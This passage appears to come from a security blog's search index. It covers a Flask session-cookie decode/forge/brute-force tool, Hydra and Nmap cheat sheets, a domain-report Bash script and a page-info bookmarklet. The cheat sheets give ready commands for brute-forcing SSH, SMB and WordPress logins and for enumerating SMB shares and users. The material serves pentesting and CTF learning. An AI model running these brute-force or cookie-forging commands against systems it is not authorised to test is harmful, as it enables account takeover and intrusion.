commands:\nDecode a Session Cookie If you know the secret key:\npython3 FOC.py decode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Without the key, you can still see the structure:\npython3 FOC.py decode -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Encode a Session Cookie To create a new session cookie:\npython3 FOC.py encode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -t \u0026#34;{\u0026#39;username\u0026#39;:\u0026#39;admin\u0026#39;,\u0026#39;role\u0026#39;:\u0026#39;superuser\u0026#39;}\u0026#34; Brute-Force the Secret Key To test key strength with a wordlist:\npython3 FOC.py bruteforce -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; -w \u0026#39;\u0026lt;path_to_wordlist\u0026gt;\u0026#39; Final Thoughts FlaskOfCookies isn’t groundbreaking, but it’s a practical little tool for anyone exploring Flask session cookies. Whether you’re trying to figure out how they work, testing your app’s security, or debugging a frustrating challenge, it’ll save you some time.\nRemember, this started as a personal project to solve a specific problem, so don’t expect perfection. That said, I hope it’s useful—and if you think of ways to improve it, feel free to fork the repo and go wild. You can find it here.\n","permalink":"http://localhost:1313/tools/flask_of_cookies/","summary":"\u003cp\u003eFlask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together \u003cstrong\u003eFlaskOfCookies\u003c/strong\u003e, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\u003c/p\u003e\n\u003cp\u003eTo be clear, this isn’t entirely my invention. It started because I hit a wall on a \u003cstrong\u003eRoot-Me challenge\u003c/strong\u003e, I couldn’t get it done with \u003cstrong\u003enoraj’s tool\u003c/strong\u003e (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\u003c/p\u003e","title":"FlaskOfCookies"},{"content":"Hydra is a powerful and flexible password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\nBasic Syntax hydra [options] \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt; Common Flags -h: Display the help menu. -l \u0026lt;username\u0026gt;: Specify a single username/login. -L \u0026lt;wordlist\u0026gt;: Use a wordlist for usernames/logins. -p \u0026lt;password\u0026gt;: Specify a single password. -P \u0026lt;wordlist\u0026gt;: Use a wordlist for passwords. -s \u0026lt;PORT\u0026gt;: Specify the target port. -f: Stop brute-forcing after finding valid credentials. -R: Restore a previous session. -t \u0026lt;number\u0026gt;: Set the number of threads to use. -V: Enable verbose mode. Supported Protocols Hydra supports numerous protocols, including:\nSSH FTP POP3 HTTP-FORM-GET HTTP-FORM-POST HTTP-HEAD HTTP-POST HTTP-GET IMAP SMB SMTP MySQL For the full list, refer to Hydra\u0026rsquo;s help menu (hydra -h).\nExamples SSH Brute-Force Attack hydra -l admin -P rockyou.txt 192.168.10.10 ssh SSH with Multiple Usernames hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 ssh SMB Brute-Force Attack hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 smb Brute-Forcing HTTP POST Forms Hydra can handle custom HTTP POST forms:\nhydra -l admin -P rockyou.txt 192.168.10.10 http-post-form \\ \u0026#34;/login:username=admin\u0026amp;password=^PASS^:F=Your password is incorrect\u0026#34; Wordpress Login Brute-Force Hydra can target WordPress login forms with custom parameters:\nhydra -l admin -P rockyou.txt 192.168.10.10 -V http-form-post \\ \u0026#34;/wp-login.php:log=admin\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log In\u0026amp;testcookie=1:S=Location\u0026#34; Tips and Tricks Session Management: Use -R to restore interrupted sessions without starting over. Efficiency: Adjust the number of threads with -t to balance speed and server load. Verbose Mode: Use -V to see each login attempt in real-time, useful for troubleshooting. Custom Form Parameters: Understand the target login form structure to craft precise Hydra commands. Final Thoughts Hydra is an essential tool in the arsenal of penetration testers and security professionals. While powerful, it must be used responsibly and only with proper authorization. Keep this cheat sheet handy to efficiently navigate Hydra\u0026rsquo;s capabilities and tailor it to your testing needs.\n\u0026ndash;\n","permalink":"http://localhost:1313/cheat-sheets/hydra/","summary":"\u003cp\u003e\u003cstrong\u003eHydra\u003c/strong\u003e is a powerful and flexible password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehydra \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-h\u003c/code\u003e\u003c/strong\u003e: Display the help menu.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-l \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single username/login.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-L \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for usernames/logins.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-P \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for passwords.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target port.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-f\u003c/code\u003e\u003c/strong\u003e: Stop brute-forcing after finding valid credentials.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Restore a previous session.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t \u0026lt;number\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Set the number of threads to use.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-V\u003c/code\u003e\u003c/strong\u003e: Enable verbose mode.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"supported-protocols\"\u003eSupported Protocols\u003c/h2\u003e\n\u003cp\u003eHydra supports numerous protocols, including:\u003c/p\u003e","title":"Hydra"},{"content":"Nmap (Network Mapper) is the go-to tool for network discovery and security auditing. It’s powerful, flexible, and essential for professionals in cybersecurity.\nBasic Syntax nmap \u0026lt;target IP\u0026gt; nmap -sT -sS -Pn -v 10.10.10.10 sudo nmap -A -sS -Pn 10.10.10.10 sudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10 Common Flags Scan Types -sT: Perform a TCP connect scan. -sU: Perform a UDP scan. -sS: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;). -Pn: Skip pinging the target. -sn: Host discovery without scanning ports. -A: Enable aggressive scan options. Advanced Features -p \u0026lt;PORT\u0026gt;: Scan specific ports. -p-: Scan all 65,535 ports. -sV: Detect services and versions running on the target. -O: Detect the operating system. -v****, -vv, ********-vvv: Set verbosity levels. --script vuln: Run vulnerability scripts. --script vulners: Use vulners scripts for CVE-based scanning. --script=http-enum: Act like Nikto to enumerate HTTP resources. Output Formats -oN: Normal text output, best for human-readable logs during manual reviews. -oX: XML output, ideal for automated tools or integrations that require structured data. ``: Greppable output, useful for scripting and quickly filtering resulst with tools like grep. -oA: Generate all three formats at once, providing maximum flexibility for further analysis or reporting. SMB Scripts Enumerate Security Mode nmap -p445 --script smb-security-mode 192.168.1.1 Enumerate Sessions nmap -p445 --script smb-enum-sessions 192.168.1.1 nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares nmap -p445 --script smb-enum-shares 192.168.1.1 nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares with Listing Listing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\nnmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Users nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Stats nmap -p445 --script smb-enum-stats --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Domains nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Groups nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=password 192.168.1.1 SSH Scripts Enumerate Algorithms nmap 192.168.1.1 -p 22 --script ssh2-enum-algos Enumerate Host Keys nmap 192.168.1.1 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full Enumerate Authentication Methods nmap 192.168.1.1 -p 22 --script ssh-auth-methods --script-args=\u0026#34;ssh.user=admin\u0026#34; Final Thoughts Nmap is a versatile and robust tool that adapts to a wide range of use cases, from simple port scans to detailed vulnerability assessments. Keep this cheat sheet handy for quick reference, and remember: the more you practice, the more efficient your scanning workflows will become!\n","permalink":"http://localhost:1313/cheat-sheets/nmap/","summary":"\u003cp\u003e\u003cstrong\u003eNmap\u003c/strong\u003e (Network Mapper) is the go-to tool for network discovery and security auditing. It’s powerful, flexible, and essential for professionals in cybersecurity.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap \u0026lt;target IP\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sT -sS -Pn -v 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -A -sS -Pn 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003ch3 id=\"scan-types\"\u003eScan Types\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sT\u003c/code\u003e\u003c/strong\u003e: Perform a TCP connect scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sU\u003c/code\u003e\u003c/strong\u003e: Perform a UDP scan.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sS\u003c/code\u003e\u003c/strong\u003e: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-Pn\u003c/code\u003e\u003c/strong\u003e: Skip pinging the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sn\u003c/code\u003e\u003c/strong\u003e: Host discovery without scanning ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-A\u003c/code\u003e\u003c/strong\u003e: Enable aggressive scan options.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"advanced-features\"\u003eAdvanced Features\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Scan specific ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p-\u003c/code\u003e\u003c/strong\u003e: Scan all 65,535 ports.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-sV\u003c/code\u003e\u003c/strong\u003e: Detect services and versions running on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-O\u003c/code\u003e\u003c/strong\u003e: Detect the operating system.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****, \u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003ccode\u003e-vv\u003c/code\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e, ****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003cstrong\u003e\u003cstrong\u003e****\u003c/strong\u003e\u003c/strong\u003e\u003c/strong\u003e\u003cstrong\u003e\u003ccode\u003e-vvv\u003c/code\u003e\u003c/strong\u003e: Set verbosity levels.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vuln\u003c/code\u003e\u003c/strong\u003e: Run vulnerability scripts.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script vulners\u003c/code\u003e\u003c/strong\u003e: Use vulners scripts for CVE-based scanning.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--script=http-enum\u003c/code\u003e\u003c/strong\u003e: Act like Nikto to enumerate HTTP resources.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"output-formats\"\u003eOutput Formats\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oN\u003c/code\u003e\u003c/strong\u003e: Normal text output, best for human-readable logs during manual reviews.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oX\u003c/code\u003e\u003c/strong\u003e: XML output, ideal for automated tools or integrations that require structured data.\u003c/li\u003e\n\u003cli\u003e``: Greppable output, useful for scripting and quickly filtering resulst with tools like \u003ccode\u003egrep\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-oA\u003c/code\u003e\u003c/strong\u003e: Generate all three formats at once, providing maximum flexibility for further analysis or reporting.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"smb-scripts\"\u003eSMB Scripts\u003c/h2\u003e\n\u003ch3 id=\"enumerate-security-mode\"\u003eEnumerate Security Mode\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-security-mode 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-sessions\"\u003eEnumerate Sessions\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-sessions --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares\"\u003eEnumerate Shares\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -p445 --script smb-enum-shares --script-args smbusername\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eadministrator,smbpassword\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003epassword 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-shares-with-listing\"\u003eEnumerate Shares with Listing\u003c/h3\u003e\n\u003cp\u003eListing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\u003c/p\u003e","title":"nmap"},{"content":"Daily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where RedFlagger comes in. This lightweight Bash script automates the process of downloading and aggregating reports from Red Flag Domains. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\nThe Backstory This project started as a bit of a joke. My friend lil-doudou had written an excellent Python tool called NewRedflag to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\nWhat Does RedFlagger Do? RedFlagger streamlines the process of collecting domain reports. Instead of manually navigating the Red Flag Domains website and downloading reports one by one, you can use RedFlagger to:\nFetch the latest report. Download reports from a specific range of dates. Aggregate all available reports into one file for easier analysis. It’s a no-frills script that prioritizes functionality and flexibility.\nHow Does It Work? RedFlagger fetches reports directly from the Red Flag Domains website by parsing the daily directory. It uses simple Bash commands like curl to download files and aggregates them into a single output file for easy handling. If you’re running a quick analysis or building a dataset for long-term research, this script has you covered.\nKey Features: Custom Date Ranges: Specify a range of days to download only the reports you need. All-Inclusive Downloads: Grab every report available with a single command. Custom Output Files: Aggregate data into a file of your choice instead of dealing with multiple separate files. Why Use RedFlagger? RedFlagger is built for simplicity and speed. It doesn’t aim to replace more advanced tools but instead provides a lightweight option for users who need quick, automated access to domain reports. If you find yourself regularly pulling data from Red Flag Domains, RedFlagger can:\nSave time by automating the download process. Ensure reports are organized and aggregated for easier analysis. Provide flexible options for handling specific dates or all available data. Whether you’re an analyst tracking malicious domains or a researcher building a threat intelligence dataset, RedFlagger can fit seamlessly into your workflow.\nGetting Started Installation RedFlagger is a standalone Bash script, so there’s no complicated setup. Here’s how to get started:\nDownload the script:\ngit clone https://github.com/noobosaurus-r3x/redflagger cd redflagger chmod +x redflagger.sh Make sure curl is installed on your system:\nsudo apt install curl Usage The script provides several options to customize your downloads. Here’s the basic syntax:\n./redflagger.sh [--latest|--days num] [--all] [--output filename] Options --latest or -l: Downloads the report from 1 day ago. --days num or -d num: Downloads the report from num days ago. --all or -a: Downloads all available reports. --output filename or -o filename: Specifies the output file to store the downloaded reports. Defaults to output.txt if no filename is provided. Examples Here are a few practical ways to use RedFlagger:\nDownload the latest report:\n./redflagger.sh -l Download all reports available since 3 days ago:\n./redflagger.sh -d 3 -a -o my_file.txt Download a specific day’s report:\n./redflagger.sh -d 5 -o report_5days_ago.txt Download all reports into a custom file:\n./redflagger.sh -a -o all_reports.txt Limitations and Room for Improvement RedFlagger is intentionally simple, but it’s not without its limitations. Here are a few areas where it could be expanded or improved:\nError Handling: While the script includes basic error checks, it could provide more detailed feedback when something goes wrong (e.g., network issues or missing reports). Parallel Downloads: Adding support for downloading multiple reports simultaneously could speed up large fetches. Advanced Filtering: Options for filtering by domain type or metadata could make the tool even more powerful. If you’re interested in extending RedFlagger, feel free to fork it and make it your own.\nFinal Thoughts RedFlagger is a small, straightforward tool designed to make life easier for anyone working with Red Flag Domains. It doesn’t try to do everything but focuses on doing one thing well: fetching and aggregating domain reports quickly and efficiently.\nWhether you’re doing threat research, building datasets, or just exploring the domain data available, RedFlagger is a lightweight addition to your toolbox. And let’s not forget—it’s also a fun jab at my friend’s Python-first approach. If you’ve got ideas for improvements or run into any issues, don’t hesitate to reach out or fork the project. Happy aggregating!\n","permalink":"http://localhost:1313/tools/redflagger/","summary":"\u003cp\u003eDaily domain reports are a treasure trove for cybersecurity analysts, but collecting and organizing them can quickly become tedious. That’s where \u003cstrong\u003eRedFlagger\u003c/strong\u003e comes in. This lightweight Bash script automates the process of downloading and aggregating reports from \u003ca href=\"https://dl.red.flag.domains/daily/\"\u003eRed Flag Domains\u003c/a\u003e. It’s simple, efficient, and built to save time—whether you’re sifting through a few recent reports or analyzing a year’s worth of data.\u003c/p\u003e\n\u003ch2 id=\"the-backstory\"\u003eThe Backstory\u003c/h2\u003e\n\u003cp\u003eThis project started as a bit of a joke. My friend \u003cstrong\u003elil-doudou\u003c/strong\u003e had written an excellent Python tool called \u003ca href=\"https://github.com/lil-doudou/NewRedflag\"\u003eNewRedflag\u003c/a\u003e to handle domain report aggregation, but he’s also a massive Bash enthusiast. So, as a playful nod to his love for scripting, I decided to rewrite the functionality in Bash—simpler, lighter, and arguably more fun (depending on your feelings about shell scripts).\u003c/p\u003e","title":"redflagger"},{"content":"When you need to quickly understand the structure of a webpage, a lightweight tool can save the day. Webpage Infos Extractor is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\nWhy Build This? Sometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\nWhat Does It Do? Once activated, the bookmarklet scans the current webpage and extracts:\nForms: Shows details like form actions, methods, and input elements.\nLinks: Lists all hyperlinks found on the page.\nImages: Displays all images in an easy-to-view layout.\nWord Count: Calculates the total number of words in the page’s text content.\nThe results are neatly presented in a new browser window with clean formatting, so you can analyze everything at a glance.\nInstallation Setting it up is simple. Here’s how:\nOpen your web browser and create a new bookmark.\nEdit the bookmark’s URL field and paste the following JavaScript code:\njavascript:(function(){var forms=document.getElementsByTagName(\u0026#39;form\u0026#39;);var links=document.getElementsByTagName(\u0026#39;a\u0026#39;);var images=document.getElementsByTagName(\u0026#39;img\u0026#39;);var bodyText=document.body.innerText;var wordCount=bodyText.split(/\\s+/).filter(function(word){return word.length\u0026gt;0;}).length;var newWindow=window.open(\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;width=800,height=600\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Extracted Data\u0026lt;/title\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;style\u0026gt;body{font-family:Arial,sans-serif}table{width:100%;border-collapse:collapse;margin-bottom:20px}th,td{border:1px solid #ddd;padding:8px;text-align:left}th{background-color:#f2f2f2}tr:nth-child(even){background-color:#f9f9f9}h2{background-color:#4CAF50;color:white;padding:10px}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Forms:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;forms.length;i++){var form=forms[i];newWindow.document.write(\u0026#39;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th colspan=\u0026#34;3\u0026#34;\u0026gt;Form \u0026#39;+(i+1)+\u0026#39;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Action\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.action||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Method\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.method||\u0026#39;get\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Name\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Type\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Value\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var j=0;j\u0026lt;form.elements.length;j++){var element=form.elements[j];var value=element.value||\u0026#39;N/A\u0026#39;;if(element.type===\u0026#39;checkbox\u0026#39;||element.type===\u0026#39;radio\u0026#39;){value=element.checked?\u0026#39;on\u0026#39;:\u0026#39;off\u0026#39;}newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.name||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.type||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+value+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Links:\u0026lt;/h2\u0026gt;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Link\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;links.length;i++){newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;+links[i].href+\u0026#39;\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026#39;+links[i].href+\u0026#39;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Images:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;images.length;i++){newWindow.document.write(\u0026#39;\u0026lt;img src=\u0026#34;\u0026#39;+images[i].src+\u0026#39;\u0026#34; style=\u0026#34;max-width:100%;display:block;margin-bottom:10px;\u0026#34;\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Word Count:\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;\u0026#39;+wordCount+\u0026#39; words\u0026lt;/p\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#39;);newWindow.document.close();})(); Save the bookmark.\nThat’s it! You now have a bookmarklet ready to extract webpage info.\nHow to Use Navigate to the webpage you want to analyze.\nClick on the saved bookmarklet.\nA new window will pop up with the following details:\nForms: Lists actions, methods, and input fields.\nLinks: Displays all hyperlinks found on the page.\nImages: Previews all images on the page.\nWord Count: Shows the total word count of the page’s text content.\nWhy Use It? This tool is perfect for:\nWeb Developers: Debugging forms, analyzing links, or reviewing images for optimization.\nContent Creators: Counting words or inspecting embedded media.\nResearchers: Extracting links or analyzing page structures quickly.\nIt’s not trying to replace full-fledged tools like browser dev tools, but it’s great for quick insights without digging into a complex interface.\nLimitations This bookmarklet is lightweight and portable, but it’s not flawless. Here are a few things to keep in mind:\nBrowser Compatibility: It works on most modern browsers but may struggle with certain page structures or dynamic content.\nStatic Analysis: It doesn’t execute JavaScript-heavy elements, so it’s best suited for simpler 